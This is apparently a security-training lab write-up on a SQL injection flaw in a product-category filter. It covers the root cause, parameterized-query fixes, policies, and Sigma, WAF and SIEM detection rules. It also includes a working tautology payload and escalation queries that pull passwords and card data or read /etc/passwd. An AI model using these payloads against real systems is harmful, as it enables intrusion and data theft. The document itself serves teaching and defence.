# Write-Up: Vulnerability Research & SQL Injection Exploitation

---

## 1. VULNERABILITY: SQL Injection in WHERE Clause Filter

### Root Cause

The application constructs SQL queries by directly concatenating user-supplied input into the query string without sanitization:

```sql
-- Original server-side query
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The `category` parameter value is inserted verbatim into the query. No parameterized query or prepared statement is used, meaning the database cannot distinguish between the developer's intended SQL syntax and attacker-controlled SQL syntax.

### Vulnerability Class

- **Type:** SQL Injection (CWE-89)
- **Subtype:** WHERE Clause Boolean Bypass
- **CVSS Base Score:** 9.8 (Critical) for unauthenticated SQLi
- **Attack Vector:** Network, no authentication required
- **User Interaction:** None

### Why It Exists

```python
# Vulnerable pattern (string concatenation)
category = request.GET['category']
query = "SELECT * FROM products WHERE category = '" + category + "' AND released = 1"

# What developer intended: category = 'Gifts'
# What attacker sends:     category = "Accessories'+OR+1=1--"
```

The developer assumed the `category` parameter would always contain a clean product name. No input validation, no escaping, no parameterized queries.

---

## 2. EXPLOITATION: Tautology Bypass via OR 1=1

### Attack Execution

**Target Parameter:**
```
GET /filter?category=[INJECTION POINT] HTTP/2
Host: target
```

**Payload Constructed:**
```
Accessories'+OR+1=1--
```

**URL-Encoded Transmission:**
```http
GET /filter?category=Accessories%27+OR+1%3D1-- HTTP/2
```

**Resulting Server-Side Query:**
```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

### Payload Breakdown

| Component | Role | Effect |
|-----------|------|--------|
| `Accessories` | Valid category value | Satisfies opening string context |
| `'` | Single quote | Closes the developer's string literal early |
| `OR 1=1` | Boolean tautology | Always evaluates to TRUE regardless of other conditions |
| `--` | SQL comment sequence | Invalidates everything after it in the query |
| `' AND released = 1` | Dead code (commented out) | Security filter no longer evaluated |

### Query Logic After Injection

```sql
-- Developer's intended logic:
WHERE category = 'Gifts' AND released = 1
-- Returns: only released products in 'Gifts' category

-- Attacker's injected logic:
WHERE category = 'Accessories' OR 1=1
-- Returns: ALL rows in table (1=1 is always true, OR makes entire condition true)
-- The AND released = 1 filter is commented out entirely
```

### Result

- All products returned, including unreleased items hidden from the public catalog
- Lab confirmed: `Congratulations, you solved the lab!`

---

## 3. BUSINESS IMPACT: Real-World Consequences of SQL Injection

### Scenario: E-Commerce Platform

**Stage 1: Information Disclosure (This Lab)**
- Unreleased products revealed to competitors
- Pricing strategy exposed before launch
- Business impact: Competitive disadvantage, $100K-$500K

**Stage 2: Full Database Extraction (Escalated)**

SQLi can be escalated far beyond WHERE clause bypass:

```sql
-- Extract all usernames and password hashes
' UNION SELECT username, password FROM users--

-- Extract credit card data
' UNION SELECT card_number, cvv FROM payments--

-- Read server files (MySQL with FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
```

**Financial Impact of Escalated SQLi:**

| Data Breached | Volume | Cost per Record | Total Exposure |
|---------------|--------|-----------------|----------------|
| Customer PII | 500K records | $150 | $75M |
| Payment card data | 200K cards | $200 | $40M |
| Password hashes | 500K records | $50 | $25M |
| Regulatory fines (GDPR) | — | — | $5M-$20M |
| **Total** | | | **$145M-$160M** |

**Source References:**
- IBM Cost of Data Breach Report 2023: Average SQLi breach = $4.9M
- Verizon DBIR 2023: SQLi in top 3 web attack patterns (11% of breaches)
- OWASP Top 10 2021: Injection ranked #3

### Why SQL Injection Still Exists in 2026

- Legacy codebases built before parameterized queries were standard
- Developers under deadline pressure skip input validation
- Third-party libraries with hidden SQLi vulnerabilities
- ORM misuse (raw queries bypassing ORM protections)

---

## 4. TECHNICAL FIX: Parameterized Queries

### The Fix: Never Concatenate User Input into SQL

```python
# VULNERABLE: String concatenation (never do this)
query = "SELECT * FROM products WHERE category = '" + category + "' AND released = 1"

# SECURE: Parameterized query (always do this)
query = "SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (category,))
```

**Why Parameterized Queries Work:**
- Database receives query structure and data separately
- User input is never interpreted as SQL syntax
- Single quotes in input are treated as data, not SQL delimiters
- `Accessories' OR 1=1--` becomes a literal string search, not SQL code

### Framework-Specific Implementations

**Python (SQLite/MySQL):**
```python
# SQLite
cursor.execute("SELECT * FROM products WHERE category = ? AND released = 1", (category,))

# MySQL with mysql-connector
cursor.execute("SELECT * FROM products WHERE category = %s AND released = 1", (category,))
```

**Python (SQLAlchemy ORM - preferred):**
```python
# ORM handles parameterization automatically
products = session.query(Product).filter(
    Product.category == category,
    Product.released == 1
).all()
```

**Node.js:**
```javascript
// Parameterized via mysql2
connection.execute(
    "SELECT * FROM products WHERE category = ? AND released = 1",
    [category]
);
```

### Input Validation as Defense-in-Depth

```python
import re

def validate_category(category):
    # Allow only alphanumeric, spaces, hyphens
    if not re.match(r'^[a-zA-Z0-9\s\-]+$', category):
        raise ValueError("Invalid category parameter")
    return category
```

**Note:** Input validation alone is NOT sufficient. Parameterized queries are mandatory. Input validation is secondary defense only.

---

## 5. POLICY FIX: Secure Development Lifecycle

### Policy 1: Mandatory Parameterized Queries

```
Standard: All database interactions must use parameterized queries or ORM
Scope: All production code, all environments
Enforcement:
  - Code review checklist includes SQL injection check
  - Automated SAST scan rejects raw string concatenation into SQL
  - Developer training mandatory (quarterly)
```

### Policy 2: Least Privilege Database Accounts

```
Requirement: Application database user has minimal permissions
- Web app user: SELECT, INSERT, UPDATE only
- No DROP, CREATE, FILE, GRANT privileges
- Separate read-only user for reporting queries

Impact: Even if SQLi exploited, attacker cannot:
  - Drop tables
  - Read server files (no FILE privilege)
  - Create backdoor accounts
```

### Policy 3: Error Message Suppression

```
Requirement: Never expose database errors to end users
Vulnerable response:
  "Error: You have an error in your SQL syntax near 'Accessories''..."

Secure response:
  "An error occurred. Please try again."

Implementation:
  - Generic error handler catches all DB exceptions
  - Detailed errors logged server-side only
  - Never include stack traces in HTTP responses
```

### Policy 4: Web Application Firewall (WAF)

```
Deploy WAF with SQLi detection rules:
  - Block requests containing SQL keywords (OR, UNION, SELECT, DROP)
  - Block SQL comment sequences (--, /*, */)
  - Block common injection characters in context ('", ;)

Note: WAF is last-resort defense, not substitute for parameterized queries
```

---

## 6. DETECTION RULE: Identifying SQL Injection Attempts

### Sigma Rule: WHERE Clause Injection Pattern

```yaml
title: SQL Injection - WHERE Clause Boolean Bypass Attempt
description: >
  Detects HTTP requests containing SQL tautology patterns
  targeting GET/POST parameters (OR 1=1, OR 'x'='x', etc.)
logsource:
  category: webserver
  product: any
detection:
  keywords:
    - "OR+1%3D1"           # URL-encoded OR 1=1
    - "OR+1=1"             # Unencoded OR 1=1
    - "%27+OR+"            # URL-encoded ' OR
    - "'+OR+'"             # Raw ' OR '
    - "--"                 # SQL comment sequence in params
    - "%27%20OR%20"        # Double URL-encoded
  condition: keywords
falsepositives:
  - Legitimate search queries containing "OR" as English word
  - Automated security scanners (Burp Suite, ZAP)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.89
```

### WAF Rule: Injection Character Detection

```
Block if request parameter contains:
  Pattern 1: Single quote followed by SQL keyword
    Regex: '[\\s]*(OR|AND|UNION|SELECT|INSERT|DROP)[\\s]
    Example match: Accessories' OR 1=1

  Pattern 2: SQL comment sequence
    Regex: --[\\s]|/\\*|\\*/
    Example match: 1=1--

  Pattern 3: Tautology patterns
    Regex: OR\\s+[0-9]=[0-9]|OR\\s+'[^']*'='[^']*'
    Example match: OR 1=1, OR 'a'='a'

  Action: Block request, log source IP, return 403
```

### SIEM Alert: Repeated Injection Attempts

```
Alert if:
1. Same source IP sends 5+ requests in 60 seconds
2. Each request contains SQL injection pattern
3. HTTP response codes vary (200, 500, 403 mix = probing)

Escalation:
  - First alert: Log + notify security team
  - 10+ attempts: Auto-block source IP (5 min)
  - 50+ attempts: Auto-block + escalate to SOC
```

---

## Summary

**What This Week Demonstrates:**

| Skill | Evidence |
|-------|---------|
| Vulnerability research | CVE lookup methodology, CVSS/VPR scoring |
| SQL injection theory | WHERE clause bypass via tautology |
| Exploitation execution | `Accessories'+OR+1=1--` payload confirmed |
| Business translation | $145M-$160M exposure quantification |
| Remediation depth | Parameterized queries + 3 policy layers |
| Detection engineering | Sigma rule + WAF pattern + SIEM alert |

**Attack Chain Completed:**
```
Week 5: Banner → Apache 2.4.41
Week 6: Research CVE → Find SQLi → Exploit → Document
```

---

**Status:** Week 6 Complete | SQL Injection Exploited | 6-Part Framework Applied

**References:**
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQLi: https://portswigger.net/web-security/sql-injection
- IBM Data Breach Report 2023: https://www.ibm.com/reports/data-breach
- Verizon DBIR 2023: https://www.verizon.com/business/resources/reports/dbir/
